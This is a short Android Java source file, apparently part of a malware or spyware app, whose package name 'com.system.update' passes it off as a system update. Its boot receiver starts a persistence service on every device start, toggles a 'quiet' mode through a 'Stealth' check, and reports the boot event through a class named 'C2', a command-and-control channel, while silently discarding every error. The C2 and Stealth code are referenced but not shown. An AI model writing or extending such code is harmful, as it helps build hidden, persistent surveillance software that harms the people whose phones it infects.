package com.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;
        try {
            Intent svc = new Intent(context, PersistService.class);
            svc.putExtra("quiet", !Stealth.isArmed(context));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(svc);
            } else {
                context.startService(svc);
            }
            if (Stealth.isArmed(context)) {
                C2.send("boot", intent.getAction());
            }
        } catch (Throwable ignored) {}
    }
}
